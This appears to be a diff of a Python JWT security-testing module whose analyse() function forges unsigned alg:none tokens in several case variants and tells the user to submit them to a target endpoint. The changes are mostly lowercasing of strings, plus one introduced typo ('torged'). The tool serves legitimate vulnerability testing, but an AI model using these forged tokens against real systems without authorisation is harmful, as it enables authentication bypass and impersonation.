@@ -17,7 +17,7 @@ import json
 
 
 def _b64url_encode(data):
-    # encode a dict or string to Base64URL without padding
+    # encode a dict or string to base64url without padding
     if isinstance(data, dict):
         data = json.dumps(data, separators=(',', ':')).encode()
     elif isinstance(data, str):
@@ -27,11 +27,11 @@ def _b64url_encode(data):
 
 def analyse(decoded):
     """
-    Test the token for the alg:none vulnerability.
+    test the token for the alg:none vulnerability.
 
-    Arg in from decoder.decode(), checking whether the algorithm 
+    arg in from decoder.decode(), checking whether the algorithm 
     is already none, then constructs a forged alg:none token 
-    regardless. Returns list of finding dicts with severity, 
+    regardless. returns list of finding dicts with severity, 
     description, and where relevant a forged_token field.
     """
     findings = []
@@ -49,6 +49,7 @@ def analyse(decoded):
         forged_header = {**header, 'alg': variant}
         forged_header_b64 = _b64url_encode(forged_header)
         payload_b64 = _b64url_encode(payload)
+
         # alg:none tokens have an empty signature segment
         forged_token = f"{forged_header_b64}.{payload_b64}."
         forged_tokens.append((variant, forged_token))
@@ -57,11 +58,11 @@ def analyse(decoded):
     if decoded['is_alg_none']:
         findings.append({
             'severity': 'CRITICAL',
-            'title': "Token already uses alg:none",
+            'title': "token already uses alg:none",
             'description': (
-                f"The token header declares alg:none with no signature. "
-                f"If a server accepts this token, it is performing no "
-                f"signature verification whatsoever. Any claims in this "
+                f"the token header declares alg:none with no signature. "
+                f"if a server accepts this token, it is performing no "
+                f"signature verification whatsoever. any claims in this "
                 f"token could have been forged by an attacker."
             ),
             'forged_token': decoded['raw']
@@ -71,10 +72,10 @@ def analyse(decoded):
         # to test whether the target server is vulnerable
         findings.append({
             'severity': 'INFO',
-            'title': "Token is signed — alg:none forged tokens generated",
+            'title': "token is signed - alg:none forged tokens generated",
             'description': (
-                f"The token is signed with {algorithm}. Forged alg:none "
-                f"variants have been generated below. Submit these to the "
+                f"the token is signed with {algorithm}. forged alg:none "
+                f"variants have been generated below. submit these to the "
                 f"target application to test whether it accepts unsigned tokens."
             ),
             'forged_tokens': [
@@ -85,11 +86,11 @@ def analyse(decoded):
     # flag if the signing input is trivially reproducible
     findings.append({
         'severity': 'INFO',
-        'title': "Forged alg:none tokens ready",
+        'title': "torged alg:none tokens ready",
         'description': (
-            f"Generated {len(none_variants)} alg:none token variants "
+            f"generated {len(none_variants)} alg:none token variants "
             f"(none, None, NONE, nOnE) to account for case-insensitive "
-            f"library implementations. Test each against the target endpoint."
+            f"library implementations. test each against the target endpoint."
         ),
         'forged_tokens': [
             {'variant': v, 'token': t} for v, t in forged_tokens
